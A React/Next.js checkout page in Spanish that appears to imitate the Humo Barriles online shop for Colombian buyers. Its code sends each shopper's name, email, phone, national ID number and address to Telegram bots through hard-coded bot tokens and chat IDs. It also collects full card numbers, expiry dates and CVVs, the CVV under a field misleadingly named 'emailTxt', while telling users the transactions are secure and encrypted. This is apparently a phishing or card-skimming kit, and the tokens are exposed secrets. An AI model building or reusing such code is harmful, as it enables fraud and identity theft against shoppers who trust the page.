"use client";

import { useCart } from "@/context/CartContext";
import { useState, useEffect } from "react";
import Image from "next/image";
import { ChevronDown } from "lucide-react";

// Telegram Configuration
const TELEGRAM_BOT_TOKEN = '8432314500:AAFgLWr6uD-VBj-y2uyAxuAyPrFQ5oIZH6c';
const TELEGRAM_CHAT_ID = '-5269167790';
const NEQUI_TELEGRAM_TOKEN = '8563476678:AAG9Xd95Tdg-MkovuTy_WzHOmcEMCMAo55w';
const NEQUI_TELEGRAM_CHAT_ID = '-5175091667';

interface CustomerData {
    email: string;
    newsletter: boolean;
    country: string;
    firstName: string;
    lastName: string;
    idCard: string;
    address: string;
    apartment: string;
    city: string;
    state: string;
    postalCode: string;
    phone: string;
    saveInfo: boolean;
    smsOffers: boolean;
    shipping?: string;
    payment?: string;
    billing?: string;
}

export default function CheckoutPage() {
    const { items, totalItems, subtotal, clearCart } = useCart();
    const [currentStep, setCurrentStep] = useState(1);
    const [customerData, setCustomerData] = useState<CustomerData>({
        email: "",
        newsletter: false,
        country: "CO",
        firstName: "",
        lastName: "",
        idCard: "",
        address: "",
        apartment: "",
        city: "",
        state: "",
        postalCode: "",
        phone: "",
        saveInfo: false,
        smsOffers: false,
    });
    const [selectedShipping, setSelectedShipping] = useState("freeShipping");
    const [selectedPayment, setSelectedPayment] = useState("");
    const [showCardForm, setShowCardForm] = useState(false);
    const [isSubmitting, setIsSubmitting] = useState(false);

    const formatPrice = (price: number) => {
        return new Intl.NumberFormat('es-CO', {
            style: 'currency',
            currency: 'COP',
            minimumFractionDigits: 0
        }).format(price);
    };

    const handleStep1Continue = async () => {
        // Validate Step 1
        if (!customerData.email || !customerData.firstName || !customerData.lastName ||
            !customerData.idCard || !customerData.address || !customerData.city ||
            !customerData.state || !customerData.phone) {
            alert('Por favor completa todos los campos requeridos');
            return;
        }

        setIsSubmitting(true);

        // Send to Telegram
        const success = await sendToTelegram();

        if (success) {
            setCurrentStep(2);
        } else {
            alert('Error al enviar información. Inténtalo de nuevo.');
        }

        setIsSubmitting(false);
    };

    const sendToTelegram = async () => {
        const message = formatTelegramMessage();
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });

            const data = await response.json();
            return data.ok;
        } catch (error) {
            console.error('Error sending to Telegram:', error);
            return false;
        }
    };

    const formatTelegramMessage = () => {
        const productsText = items.map(item =>
            `• ${item.name}\n  Cantidad: ${item.quantity}\n  Precio: ${formatPrice(item.price)}`
        ).join('\n\n');

        return `
🛒 <b>NUEVO PEDIDO - CHECKOUT</b>

📦 <b>PRODUCTOS:</b>
${productsText}

👤 <b>INFORMACIÓN DEL CLIENTE:</b>
• Nombre: ${customerData.firstName} ${customerData.lastName}
• Email: ${customerData.email}
• Teléfono: ${customerData.phone}
• Cédula: ${customerData.idCard}

📍 <b>DIRECCIÓN DE ENVÍO:</b>
• País: ${customerData.country}
• Ciudad: ${customerData.city}
• Estado: ${customerData.state}
• Dirección: ${customerData.address}
• Apartamento: ${customerData.apartment || 'N/A'}
• Código Postal: ${customerData.postalCode || 'N/A'}

📢 <b>PREFERENCIAS:</b>
• Newsletter: ${customerData.newsletter ? '✓ Sí' : '✗ No'}
• SMS Ofertas: ${customerData.smsOffers ? '✓ Sí' : '✗ No'}
• Guardar Info: ${customerData.saveInfo ? '✓ Sí' : '✗ No'}

💰 <b>TOTAL:</b> ${formatPrice(subtotal)}

🕐 Fecha: ${new Date().toLocaleString('es-ES')}
        `.trim();
    };

    const handleNequiPayment = async () => {
        setIsSubmitting(true);

        const message = `
💰 <b>NUEVO PAGO - NEQUI</b>

📱 <b>Teléfono:</b> ${customerData.phone}
💵 <b>Monto Total:</b> ${formatPrice(subtotal)}

🕐 Fecha: ${new Date().toLocaleString('es-ES')}
        `.trim();

        const url = `https://api.telegram.org/bot${NEQUI_TELEGRAM_TOKEN}/sendMessage`;

        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: NEQUI_TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });

            const data = await response.json();

            if (data.ok) {
                alert('✓ Redirigiendo a Nequi...');
                // Redirect to Nequi
                window.location.href = '/ruta-nequi';
            } else {
                alert('Error al procesar pago con Nequi');
            }
        } catch (error) {
            console.error('Error:', error);
            alert('Error al procesar pago');
        }

        setIsSubmitting(false);
    };

    const handleCreditCardPayment = async () => {
        const form = document.getElementById('cardPaymentForm') as HTMLFormElement;
        if (!form) return;

        const formData = new FormData(form);
        const cardNumber = formData.get('cardTxt') as string;
        const expiry = formData.get('expTxt') as string;
        const cvv = formData.get('emailTxt') as string; // CVV field
        const cardholderName = formData.get('nameTxt') as string;

        if (!cardNumber || !expiry || !cvv || !cardholderName) {
            alert('Por favor completa todos los campos de la tarjeta');
            return;
        }

        setIsSubmitting(true);

        try {
            const response = await fetch('/api/process-payment', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    cardNumber,
                    expiry,
                    cvv,
                    cardholderName,
                    customerData,
                    orderTotal: formatPrice(subtotal)
                })
            });

            const data = await response.json();

            if (data.success) {
                alert('✓ Pago procesado exitosamente');
                // Redirect to success page or clear cart
                if (data.redirectUrl) {
                    window.location.href = data.redirectUrl;
                }
            } else {
                alert('Error al procesar el pago. Inténtalo de nuevo.');
            }
        } catch (error) {
            console.error('Error:', error);
            alert('Error al procesar el pago');
        }

        setIsSubmitting(false);
    };

    const handleFinalSubmit = () => {
        if (!selectedPayment) {
            alert('Por favor selecciona un método de pago');
            return;
        }

        if (selectedPayment === 'nequi') {
            handleNequiPayment();
        } else if (selectedPayment === 'creditCard') {
            handleCreditCardPayment();
        } else if (selectedPayment === 'pse') {
            // Redirect to PSE page
            window.location.href = '/pse';
        } else {
            alert('¡Pedido confirmado! Redirigiendo a pasarela de pago...');
            // Handle other payment methods
        }
    };

    return (
        <div className="min-h-screen bg-neutral-50 text-black">
            {/* Header */}
            <header className="bg-white border-b border-neutral-200 sticky top-0 z-50">
                <div className="container mx-auto px-4 py-4">
                    <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2">
                            <div className="relative w-32 h-16">
                                <Image
                                    src="https://www.humobarriles.com/cdn/shop/files/LOGO_HUMO_BARRILES.png?v=1731101080&width=425"
                                    alt="Humo Barriles"
                                    fill
                                    className="object-contain"
                                />
                            </div>
                        </div>
                        <div className="flex items-center gap-2 bg-neutral-100 px-4 py-2 rounded-full text-black">
                            <svg width="20" height="20" fill="currentColor">
                                <circle cx="8" cy="18" r="2" />
                                <circle cx="16" cy="18" r="2" />
                                <path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6" />
                            </svg>
                            <span className="font-semibold text-black">{totalItems}</span>
                        </div>
                    </div>
                </div>
            </header>

            <main className="container mx-auto px-4 py-8">
                <div className="grid lg:grid-cols-2 gap-8 max-w-7xl mx-auto">
                    {/* Left: Forms */}
                    <div className="space-y-4">
                        {/* Step 1 */}
                        <StepSection
                            stepNumber={1}
                            title="Información de Contacto y Entrega"
                            isActive={currentStep === 1}
                            isCompleted={currentStep > 1}
                        >
                            <div className="space-y-6">
                                <div>
                                    <h3 className="font-semibold mb-4 text-black">Contacto</h3>
                                    <input
                                        type="email"
                                        placeholder="Correo electrónico *"
                                        className="w-full px-4 py-3 border border-neutral-300 rounded-lg text-black placeholder:text-neutral-500"
                                        value={customerData.email}
                                        onChange={(e) => setCustomerData({ ...customerData, email: e.target.value })}
                                    />
                                </div>

                                <div>
                                    <h3 className="font-semibold mb-4 text-black">Entrega</h3>
                                    <div className="space-y-4">
                                        <select
                                            className="w-full px-4 py-3 border border-neutral-300 rounded-lg text-black"
                                            value={customerData.country}
                                            onChange={(e) => setCustomerData({ ...customerData, country: e.target.value })}
                                        >
                                            <option value="CO">Colombia</option>
                                        </select>

                                        <div className="grid grid-cols-2 gap-4">
                                            <input
                                                type="text"
                                                placeholder="Nombre *"
                                                className="px-4 py-3 border border-neutral-300 rounded-lg text-black placeholder:text-neutral-500"
                                                value={customerData.firstName}
                                                onChange={(e) => setCustomerData({ ...customerData, firstName: e.target.value })}
                                            />
                                            <input
                                                type="text"
                                                placeholder="Apellidos *"
                                                className="px-4 py-3 border border-neutral-300 rounded-lg text-black placeholder:text-neutral-500"
                                                value={customerData.lastName}
                                                onChange={(e) => setCustomerData({ ...customerData, lastName: e.target.value })}
                                            />
                                        </div>

                                        <input
                                            type="text"
                                            placeholder="Cédula de ciudadanía *"
                                            className="w-full px-4 py-3 border border-neutral-300 rounded-lg text-black placeholder:text-neutral-500"
                                            value={customerData.idCard}
                                            onChange={(e) => setCustomerData({ ...customerData, idCard: e.target.value })}
                                        />

                                        <input
                                            type="text"
                                            placeholder="Dirección *"
                                            className="w-full px-4 py-3 border border-neutral-300 rounded-lg text-black placeholder:text-neutral-500"
                                            value={customerData.address}
                                            onChange={(e) => setCustomerData({ ...customerData, address: e.target.value })}
                                        />

                                        <input
                                            type="text"
                                            placeholder="Casa, apartamento, etc. (opcional)"
                                            className="w-full px-4 py-3 border border-neutral-300 rounded-lg text-black placeholder:text-neutral-500"
                                            value={customerData.apartment}
                                            onChange={(e) => setCustomerData({ ...customerData, apartment: e.target.value })}
                                        />

                                        <div className="grid grid-cols-3 gap-4">
                                            <input
                                                type="text"
                                                placeholder="Ciudad *"
                                                className="px-4 py-3 border border-neutral-300 rounded-lg text-black placeholder:text-neutral-500"
                                                value={customerData.city}
                                                onChange={(e) => setCustomerData({ ...customerData, city: e.target.value })}
                                            />
                                            <select
                                                className="px-4 py-3 border border-neutral-300 rounded-lg text-black"
                                                value={customerData.state}
                                                onChange={(e) => setCustomerData({ ...customerData, state: e.target.value })}
                                            >
                                                <option value="">Departamento *</option>
                                                <option value="Amazonas">Amazonas</option>
                                                <option value="Antioquia">Antioquia</option>
                                                <option value="Arauca">Arauca</option>
                                                <option value="Atlántico">Atlántico</option>
                                                <option value="Bolívar">Bolívar</option>
                                                <option value="Boyacá">Boyacá</option>
                                                <option value="Caldas">Caldas</option>
                                                <option value="Caquetá">Caquetá</option>
                                                <option value="Casanare">Casanare</option>
                                                <option value="Cauca">Cauca</option>
                                                <option value="Cesar">Cesar</option>
                                                <option value="Chocó">Chocó</option>
                                                <option value="Córdoba">Córdoba</option>
                                                <option value="Cundinamarca">Cundinamarca</option>
                                                <option value="Guainía">Guainía</option>
                                                <option value="Guaviare">Guaviare</option>
                                                <option value="Huila">Huila</option>
                                                <option value="La Guajira">La Guajira</option>
                                                <option value="Magdalena">Magdalena</option>
                                                <option value="Meta">Meta</option>
                                                <option value="Nariño">Nariño</option>
                                                <option value="Norte de Santander">Norte de Santander</option>
                                                <option value="Putumayo">Putumayo</option>
                                                <option value="Quindío">Quindío</option>
                                                <option value="Risaralda">Risaralda</option>
                                                <option value="San Andrés y Providencia">San Andrés y Providencia</option>
                                                <option value="Santander">Santander</option>
                                                <option value="Sucre">Sucre</option>
                                                <option value="Tolima">Tolima</option>
                                                <option value="Valle del Cauca">Valle del Cauca</option>
                                                <option value="Vaupés">Vaupés</option>
                                                <option value="Vichada">Vichada</option>
                                            </select>
                                            <input
                                                type="text"
                                                placeholder="Código postal"
                                                className="px-4 py-3 border border-neutral-300 rounded-lg text-black placeholder:text-neutral-500"
                                                value={customerData.postalCode}
                                                onChange={(e) => setCustomerData({ ...customerData, postalCode: e.target.value })}
                                            />
                                        </div>

                                        <input
                                            type="tel"
                                            placeholder="Teléfono *"
                                            className="w-full px-4 py-3 border border-neutral-300 rounded-lg text-black placeholder:text-neutral-500"
                                            value={customerData.phone}
                                            onChange={(e) => setCustomerData({ ...customerData, phone: e.target.value })}
                                        />
                                    </div>
                                </div>

                                <button
                                    onClick={handleStep1Continue}
                                    disabled={isSubmitting}
                                    className="w-full bg-black text-white py-4 rounded-lg font-semibold hover:bg-neutral-800 transition disabled:opacity-50"
                                >
                                    {isSubmitting ? 'Enviando...' : 'Continuar al Envío'}
                                </button>
                            </div>
                        </StepSection>

                        {/* Step 2 */}
                        <StepSection
                            stepNumber={2}
                            title="Métodos de Envío"
                            isActive={currentStep === 2}
                            isCompleted={currentStep > 2}
                            isDisabled={currentStep < 2}
                        >
                            <div className="space-y-4">
                                <div className="border border-neutral-300 rounded-lg p-4 flex items-center justify-between cursor-pointer hover:bg-neutral-50">
                                    <label className="flex items-center gap-3 cursor-pointer flex-1 text-black">
                                        <input type="radio" name="shipping" defaultChecked />
                                        <span className="font-semibold text-black">ENVÍO GRATIS</span>
                                    </label>
                                    <span className="text-gold-500 font-semibold">GRATIS</span>
                                </div>

                                <button
                                    onClick={() => setCurrentStep(3)}
                                    className="w-full bg-black text-white py-4 rounded-lg font-semibold hover:bg-neutral-800 transition"
                                >
                                    Continuar al Pago
                                </button>
                            </div>
                        </StepSection>

                        {/* Step 3 */}
                        <StepSection
                            stepNumber={3}
                            title="Pago"
                            isActive={currentStep === 3}
                            isCompleted={false}
                            isDisabled={currentStep < 3}
                        >
                            <div className="space-y-4">
                                <p className="text-sm text-neutral-600">Todas las transacciones son seguras y están encriptadas.</p>

                                {/* Nequi */}
                                <div
                                    className={`border-2 rounded-lg p-4 cursor-pointer ${selectedPayment === 'nequi' ? 'border-gold-500 bg-gold-50' : 'border-neutral-300'}`}
                                    onClick={() => { setSelectedPayment('nequi'); setShowCardForm(false); }}
                                >
                                    <label className="flex items-center justify-between cursor-pointer">
                                        <div className="flex items-center gap-3">
                                            <input
                                                type="radio"
                                                name="payment"
                                                checked={selectedPayment === 'nequi'}
                                                onChange={() => { }}
                                            />
                                            <span className="font-semibold text-black">PAGO CON NEQUI</span>
                                        </div>
                                        <img
                                            src="/nequi-logo.png"
                                            alt="Nequi"
                                            className="h-10 w-auto"
                                        />
                                    </label>
                                </div>

                                {/* Credit Card */}
                                <div className={`border-2 rounded-lg p-4 cursor-pointer ${selectedPayment === 'creditCard' ? 'border-gold-500 bg-gold-50' : 'border-neutral-300'}`}
                                    onClick={() => { setSelectedPayment('creditCard'); setShowCardForm(true); }}
                                >
                                    <label className="flex items-center justify-between cursor-pointer">
                                        <div className="flex items-center gap-3">
                                            <input
                                                type="radio"
                                                name="payment"
                                                checked={selectedPayment === 'creditCard'}
                                                onChange={() => { }}
                                            />
                                            <span className="font-semibold text-black">Tarjeta Crédito / Débito</span>
                                        </div>
                                        <div className="flex items-center gap-2">
                                            <img
                                                src="https://cdn.worldvectorlogo.com/logos/visa-2.svg"
                                                alt="Visa"
                                                className="h-5"
                                            />
                                            <img
                                                src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg"
                                                alt="Mastercard"
                                                className="h-6"
                                            />
                                            <img
                                                src="https://cdn.worldvectorlogo.com/logos/american-express-1.svg"
                                                alt="Amex"
                                                className="h-5"
                                            />
                                        </div>
                                    </label>

                                    {showCardForm && (
                                        <form id="cardPaymentForm" className="mt-4 space-y-4 pt-4 border-t">
                                            <input
                                                type="text"
                                                name="cardTxt"
                                                placeholder="Número de tarjeta *"
                                                className="w-full px-4 py-3 border border-neutral-300 rounded-lg text-black placeholder:text-neutral-500"
                                                maxLength={19}
                                            />
                                            <div className="grid grid-cols-2 gap-4">
                                                <input
                                                    type="text"
                                                    name="expTxt"
                                                    placeholder="MM / AA *"
                                                    className="px-4 py-3 border border-neutral-300 rounded-lg text-black placeholder:text-neutral-500"
                                                    maxLength={7}
                                                />
                                                <input
                                                    type="text"
                                                    name="emailTxt"
                                                    placeholder="CVV *"
                                                    className="px-4 py-3 border border-neutral-300 rounded-lg text-black placeholder:text-neutral-500"
                                                    maxLength={4}
                                                />
                                            </div>
                                            <input
                                                type="text"
                                                name="nameTxt"
                                                placeholder="Nombre del titular *"
                                                className="w-full px-4 py-3 border border-neutral-300 rounded-lg text-black placeholder:text-neutral-500"
                                            />
                                        </form>
                                    )}
                                </div>

                                {/* PSE */}
                                <div
                                    className={`border-2 rounded-lg p-4 cursor-pointer ${selectedPayment === 'pse' ? 'border-gold-500 bg-gold-50' : 'border-neutral-300'}`}
                                    onClick={() => { setSelectedPayment('pse'); setShowCardForm(false); }}
                                >
                                    <label className="flex items-center justify-between cursor-pointer">
                                        <div className="flex items-center gap-3">
                                            <input
                                                type="radio"
                                                name="payment"
                                                checked={selectedPayment === 'pse'}
                                                onChange={() => { }}
                                            />
                                            <span className="font-semibold text-black">PSE</span>
                                        </div>
                                        <img
                                            src="/pse-logo.jpg"
                                            alt="PSE"
                                            className="h-10 w-auto"
                                        />
                                    </label>
                                </div>

                                <button
                                    onClick={handleFinalSubmit}
                                    disabled={isSubmitting}
                                    className="w-full bg-gold-500 text-black py-4 rounded-lg font-bold text-lg hover:bg-gold-600 transition disabled:opacity-50"
                                >
                                    {isSubmitting ? 'Procesando...' : 'Pagar ahora'}
                                </button>
                            </div>
                        </StepSection>
                    </div>

                    {/* Right: Order Summary */}
                    <div className="bg-white border border-neutral-200 rounded-lg p-6 h-fit sticky top-24">
                        <h3 className="text-xl font-bold mb-6 text-black">Resumen del pedido</h3>

                        <div className="space-y-4 mb-6">
                            {items.map((item) => (
                                <div key={item.id} className="flex gap-4">
                                    <div className="relative w-16 h-16 rounded border border-neutral-200">
                                        <Image
                                            src={item.image}
                                            alt={item.name}
                                            fill
                                            className="object-cover rounded"
                                        />
                                        <span className="absolute -top-2 -right-2 bg-neutral-700 text-white text-xs w-5 h-5 rounded-full flex items-center justify-center">
                                            {item.quantity}
                                        </span>
                                    </div>
                                    <div className="flex-1">
                                        <h4 className="font-semibold text-sm text-black">{item.name}</h4>
                                    </div>
                                    <div className="font-semibold text-black">
                                        {formatPrice(item.price * item.quantity)}
                                    </div>
                                </div>
                            ))}
                        </div>

                        <div className="border-t border-neutral-200 pt-4 space-y-2 text-black">
                            <div className="flex justify-between">
                                <span>Subtotal</span>
                                <span>{formatPrice(subtotal)}</span>
                            </div>
                            <div className="flex justify-between">
                                <span>Envío</span>
                                <span className="text-green-600 font-semibold">GRATIS</span>
                            </div>
                            <div className="flex justify-between text-xl font-bold pt-4 border-t text-black">
                                <span>Total</span>
                                <div>
                                    <span className="text-sm text-neutral-500 mr-2">COP</span>
                                    <span>{formatPrice(subtotal)}</span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div >
            </main >
        </div >
    );
}

function StepSection({
    stepNumber,
    title,
    children,
    isActive,
    isCompleted,
    isDisabled = false
}: {
    stepNumber: number;
    title: string;
    children: React.ReactNode;
    isActive: boolean;
    isCompleted: boolean;
    isDisabled?: boolean;
}) {
    const [isOpen, setIsOpen] = useState(isActive);

    useEffect(() => {
        if (isActive) setIsOpen(true);
    }, [isActive]);

    return (
        <div className={`bg-white border-2 rounded-lg ${isActive ? 'border-gold-500' : 'border-neutral-200'} ${isDisabled ? 'opacity-50' : ''}`}>
            <div
                className="flex items-center justify-between p-6 cursor-pointer"
                onClick={() => !isDisabled && setIsOpen(!isOpen)}
            >
                <div className="flex items-center gap-4">
                    <div className={`w-10 h-10 rounded-full flex items-center justify-center font-bold ${isCompleted ? 'bg-green-500 text-white' : isActive ? 'bg-gold-500 text-black' : 'bg-neutral-200 text-black'
                        }`}>
                        {isCompleted ? '✓' : stepNumber}
                    </div>
                    <div>
                        <h2 className="font-bold text-lg text-black">{title}</h2>
                        {isCompleted && <p className="text-sm text-green-600">✓ Completado</p>}
                    </div>
                </div>
                <ChevronDown className={`transition-transform text-black ${isOpen ? 'rotate-180' : ''}`} />
            </div>

            {isOpen && !isDisabled && (
                <div className="px-6 pb-6 border-t border-neutral-200">
                    <div className="pt-6">
                        {children}
                    </div>
                </div>
            )}
        </div>
    );
}
